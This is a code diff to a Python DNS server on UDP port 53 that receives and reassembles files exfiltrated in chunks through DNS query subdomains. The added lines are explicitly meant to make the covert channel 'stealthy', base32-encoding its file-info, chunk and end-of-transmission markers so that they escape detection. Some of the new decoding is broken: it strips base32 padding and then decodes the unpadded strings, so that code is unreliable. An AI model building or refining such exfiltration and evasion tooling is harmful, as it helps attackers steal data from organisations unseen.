@@ -12,6 +12,7 @@ UDP_PORT = 53
 # Create the UDP socket and bind it to the IP and port
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.bind((UDP_IP, UDP_PORT))
+sock.settimeout(10)  # Set a timeout of 10 seconds for receiving data
 
 # Print the IP and port the server is listening on
 print(f"Listening on {UDP_IP}:{UDP_PORT}")
@@ -27,9 +28,17 @@ def calculate_md5(data):
     md5.update(data)
     return md5.hexdigest()
 
+# Function to make strings stealthy (e.g., random-looking subdomains)
+def obfuscate_data(data):
+    return base64.b32encode(data.encode()).decode().strip("=")
+
 # Listen for incoming DNS requests
 while not is_transmission_complete:
-    byteData, addr = sock.recvfrom(2048)
+    try:
+        byteData, addr = sock.recvfrom(2048)
+    except socket.timeout:
+        print("Socket timed out waiting for data.")
+        continue
 
     try:
         # Since we are dealing with binary data, do not decode it as utf-8
@@ -38,23 +47,25 @@ while not is_transmission_complete:
         print(f"Error decoding data: {e}")
         continue
 
-    # Check for end of transmission signal
-    if f"end.chunk999.{domain}" in data:
-        print("Received end of transmission signal.")
+    # Stealthy end of transmission signal (e.g., 'zzz' encoded)
+    end_signal = obfuscate_data("zzz") + f".{domain}"
+    if end_signal in data:
+        print("Received stealthy end of transmission signal.")
         is_transmission_complete = True
         continue
 
-    # Check for file info message (contains file name and md5)
-    if f"fileinfo.{domain}" in data:
+    # Stealthy file info message
+    fileinfo_signal = obfuscate_data("fileinfo") + f".{domain}"
+    if fileinfo_signal in data:
         parts = data.split('.')
         if len(parts) >= 3:
-            file_name = parts[0]
-            file_md5 = parts[1]
+            file_name = base64.b32decode(parts[0]).decode('utf-8')  # Decode the file name
+            file_md5 = base64.b32decode(parts[1]).decode('utf-8')   # Decode the expected hash
             print(f"Received file name: {file_name}, Expected MD5 hash: {file_md5}")
         continue
 
-    # Extract the chunk number and data using regex
-    match = re.match(rf'([A-Z0-9]+)\.chunk(\d+)\.{domain}', data)
+    # Extract the chunk number and data using regex (encoded stealthily)
+    match = re.match(rf'([A-Z0-9]+)\.{obfuscate_data("chunk")}\.(\d+)\.{domain}', data)
     if match:
         encoded_chunk, sequence_number = match.groups()
         print(f"Received chunk {sequence_number} from {addr}")
@@ -71,6 +82,7 @@ while not is_transmission_complete:
 
 # Reassemble the file
 if file_name and file_md5:
+    print("Reassembling the file...")
     # Sort the chunks by sequence number
     ordered_chunks = [file_chunks[i] for i in sorted(file_chunks.keys())]
     
